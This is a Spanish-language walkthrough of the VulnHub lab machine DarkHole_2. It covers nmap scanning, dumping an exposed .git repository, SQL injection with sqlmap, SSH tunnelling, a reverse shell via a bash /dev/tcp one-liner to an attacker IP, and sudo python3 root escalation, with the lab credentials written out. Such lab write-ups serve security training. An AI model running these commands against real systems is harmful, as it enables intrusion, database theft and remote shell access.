
**Nombre de la maquina**
	Empire: Darkhole_2
**Dirección de enlace**
	https://www.vulnhub.com/entry/darkhole-2,740/
**Modo de Red**
	Bridget Automatic
**Virtualizado**
	VMware

> [!WARNING] VM DarkHole_2
> Segun las anotaciones del creador, esta maquina opera mejor en vmware que en virtual box
### Recopilación de Información

Al tener en cuenta que la maquina se encuentra en el mismo segmento de red, procedemos a usar el comando **[[Recursos#**netdiscover**|netdiscover]]**.

	netdiscover -r 192.168.1.0/24

![[Pasted image 20240409194723.png]]

Una vez obtenemos un escaneo de la red local, y obtenemos la IP de cada uno de los dispositivos en la red local, debemos a proceder a identificar cual es la maquina que vamos a atacar.

Para poder identificar cual es la maquina objetivo, procedimos a realizar un escaneo con la herramienta **[[Recursos#nmap|nmap]]** en cada una de las IP usando el siguiente comando.

	sudo nmap -T4 -sC -sV -oN nmap.log

![[Pasted image 20240409194802.png]]

Al realizar el escaneo determinamos que la IP **192.168.1.14** pertenece a la maquina objetivo.

> [!NOTE] Servicios que se ejecutan en los puertos de la maquina
> 20 =  Detectamos que se esta ejecutando un **OpenSSH 8.2p1**
> 
> 80 = Detectamos que se esta ejecutando un **Apache httpd 2.4.41**
> 
> `Adicionalmente nmap nos reconoció que existe un *http-git* y un */.git*` 

Navegando en la pagina, vemos que existe la ruta **/login.php**, así que nuestro objetivo será obtener las credenciales de ese login.

![[Pasted image 20240409213855.png]]

Aprovecharemos a investigar e iremos a ver esa dirección que nmap descubrió a ver que encontramos. http://192.168.1.14/.git

![[Pasted image 20240409213608.png]]

Hasta aquí todo bien, pero el detalle esta que no podemos leer esta información, además que hace falta.
### Enumeración de Directorios

> [!TIP] Herramienta
> Si recordamos bien, ya contamos una herramienta para este tipo de escenario, así que hagamos uso de [Git Tool](https://github.com/internetwache/GitTools).

**Pero para tener mayor variedad de herramientas ocuparemos [Git Dumper](https://github.com/arthaud/git-dumper)**.

![[Pasted image 20240409223545.png]]

Extraemos el repo en nuestra carpeta **Documentos/**

	git clone https://github.com/arthaud/git-dumper.git

Y ejecutamos con el siguiente comando.

	./git_dumper.py http://192.168.1.14/.git/ backup

![[Pasted image 20240409231924.png]]

> [!BUG] Error: No module name dulwich
> Si en algun dado caso les muestra este error, lo necesario es mantener el kali actualizado y luego de ejecutar el siguiente comando.
> 
> `sudo apt-get install python3-dulwich`
> `sudo python3 -c "import dulwich; print(dulwich.__version__)"`

Y nos dirigimos al directorio backups.

![[Pasted image 20240409231902.png]]

Ahora nuestro problema es que estos archivos no se pueden leer ya que no estamos ingresando con una petición de git, así que para ello ocuparemos el comando.

	sudo git log

![[Pasted image 20240409232207.png]]

> [!NOTE] Git Log
> Este comando se utiliza para mostrar un registro detallado de la historia del repositorio git. Esto también nos va a incluir la información como: cambios, quien la realizo y en que fecha se realizaron.

Es hora de revisar los detalles.

Como nota adicional, este no lo veremos por que nos esta indicando que necesitamos permisos especiales... pero los demás no así que vamos a ello.

![[Pasted image 20240409232434.png]]

Veremos el que le sigue **a4d900a8d85e8938d3601f3cef113ee293028e10**.

![[Pasted image 20240409234451.png]]

Analicemos lo siguiente:

- Se esta ejecutando con **MySQL**
- Tenemos el email: lush@admin.com
- Tenemos la pass: **321**

Y si recordamos bien, en la pagina principal, teníamos un login que pedía como credenciales correo y password, así que vayamos a iniciar sesión.

![[Pasted image 20240415041136.png]]

Una vez que hemos entrado a la web, a simple vista podemos observar un URL posiblemente vulnerable **dashboard.php?id=1**. 
### Explotación

Pero antes de nada haremos uso de la herramienta [[Recursos#sqlmap||Sqlmap]], para poder obtener información de la base de datos haciendo uso del siguiente comando.

	sudo sqlmap -r request --dbs -batch

![[Pasted image 20240415044524.png]]

> [!TIP] Sqlmap
> El comando request es la petición que se envía al interactuar con la pagina, descargada como item desde Burpsuite.

![[Pasted image 20240415045723.png]]

Ahora que ya conocemos que existen 5 BD, comencemos a extraer información de cada una, iniciando por la primera.

	sudo sqlmap -r request -D darkhole_2 --dump-all --batch

![[Pasted image 20240415050722.png]]

> [!EXAMPLE] ¿Otra manera?
> Otra manera de poder realizar un SQLi con Sqlmap, es a traves del comando
> 
> `sudo sqlmap -u http://192.168.1.20/dashboard.php?id=1 --cookie='PHPSESSID=35574fl2dsldltkq3odrbhq4tn' --dbs=mysql --current-db`
> 
> `sudo sqlmap -u http://192.168.1.20/dashboard.php?id=1 --cookie='PHPSESSID=35574fl2dsldltkq3odrbhq4tn' --dbs=mysql --current-db -D darkhole_2 --tables`
> 
> `sudo sqlmap -u http://192.168.1.20/dashboard.php?id=1 --cookie='PHPSESSID=35574fl2dsldltkq3odrbhq4tn' --dbs=mysql --current-db -D darkhole_2 [table] --dump`

Importante! Recuerdan aquellos resultados de ¿nmap?. Teníamos el puerto 22(SSH) open, así que con los datos recuperados por la herramienta, trataremos de conectarnos.

![[Pasted image 20240415051607.png]]
### Post - Explotación/Escalación de Privilegios

Ahora buscamos la carpeta **[[Linux Fundamentals#Jerarquía del Sistema de archivos|/tmp]]** y a través de un server en python3 nos traemos la herramienta [linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240414-ed0a5fac) para poder encontrar vulnerabilidades que nos permitan escalar privilegios.

![[Pasted image 20240415055408.png]]

y usamos el comando `chmod 777 linpeas.sh` y listamos.

![[Pasted image 20240415055440.png]]

Ahora, ejecutamos.

![[Pasted image 20240415055657.png]]

> [!NOTE] Linpeas
> **LinPEAS es un script que la búsqueda de posibles rutas para escalar privilegios en Linux/Unix*/MacOS los ejércitos. Los controles se explican en el [libro.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)**

> [!TIP] Legenda
> La herramienta linpeas, ya nos entrega una legenda indicándonos el esquema de colores, que significa cada cosa, ayudándonos bastante en la identificación de vulnerabilidad encontradas.
> 
![[Pasted image 20240417112517.png]]

Ahora, nuestro objetivo es lograr escalar privilegios, y lo haremos mediante **directorios**.

![[Pasted image 20240417113740.png]]

Nos dirigimos a la ruta para verificar el contenido.

![[Pasted image 20240417113918.png]]

Nos damos cuenta que existe un archivo index.php cuyo código tiene como parámetro obtener un **cmd**. Con esto nos da la posibilidad de conseguir una shell inversa.

Nos dirigimos a la direccion localhost:9999 a ver que logramos encontrar.

![[Pasted image 20240417115135.png]]

> [!WARNING] Importante
> Siempre es importante leer las respuestas que obtenemos, por ejemplo en esta ocasión Firefox nos da 3 posibles casos de que pudo haber sucedido y uno de ellos dice:
> 
> `If your computer or network is protected by a firewall or proxy, make sure that Firefox is permitted to access the web.`

Así que intentémoslo de nuevo pero a través de una conexión ssh con el comando.

	sudo ssh jehad@192.168.1.14 -L 9999:localhost:9999

![[Pasted image 20240417115456.png]]

Ahora nos dirigimos a la web.

![[Pasted image 20240417115527.png]]

> [!FAILURE] ¿Por que pasa esto?
> El motivo el cual nos conectamos a ssh primero, es debido a que la conexión requería de un acceso, es decir un usuario registrado. Al acceder con ssh le estamos diciendo al navegador que al referencia el localhost se identifique con el usuario con el cual nos conectamos al SSH.

Ya que hemos entrado a la pagina y sabemos que tiene como parametro obtener un cmd, nos facilita las cosas. Solamente ingresamos la entrada **/?cmd=**.

	localhost:9999/?cmd=[command]

![[Pasted image 20240417120826.png]]

Ahora, lo primero que haremos para realizar un reverse shell es levantar un [[Recursos#**nc**|netcat]]

	nc -lvp 1234

![[Pasted image 20240417121830.png]]

Luego nos ocupamos el siguiente comando.

	bash -c 'bash -i >& /dev/tcp/192.168.1.31/8888 0>&1'

> [!TIP] URL
> Al estar ingresando este comando en una URL es necesario convertirlo para que el navegador sea capaz de entenderlo.

![[Pasted image 20240417122219.png]]

Y revisamos nuestra consola. Y listo, hemos entrado a través del usuario **losy**.

![[Pasted image 20240419025029.png]]

Ahora que estamos dentro, naveguemos un poco para ver que encontramos. Nos iremos al directorio principal y listaremos para ver que encontramos

![[Pasted image 20240419025627.png]]

Vemos que existe un **.bash_history**, asi que vemos que podemos encontrar dentro de este.

![[Pasted image 20240419025713.png]]

![[Pasted image 20240419025735.png]]

Revisando el historial obtuvimos.

> user: losy
> pass: gang
> Un sudo con comandos de acceso.

Ahora ejecutaremos.

	sudo -l

![[Pasted image 20240419030214.png]]

> [!NOTE] Title
> Este se debe a que nos conectamos a traves de un reverse shell, sin autenticarnos, pero lo podemos solucionar con python.
> 

Hacemo uso del comando en python para mejorar nuestra interaccion con la terminal del sistema remoto con el comando.

	python3 -c 'import pty; pty.spawn("/bin/bash")'

![[Pasted image 20240419030448.png]]

Ahora ejecutamos nuevamente el comando

	sudo -l

![[Pasted image 20240419030518.png]]

Y listo!. Ahora que sabemos que python3 opera bajo sudo, aprovecharemos los comandos que encontramos en el history.

	sudo python3 -c 'import os; os.system("/bin/sh")'

![[Pasted image 20240419031823.png]]

Ahora naveguemos un poco para ver que mas podemos encontrar una vez que hemos escalado privilegios.

![[Pasted image 20240419032031.png]]

Y listo, hemos Finalizado!!!.


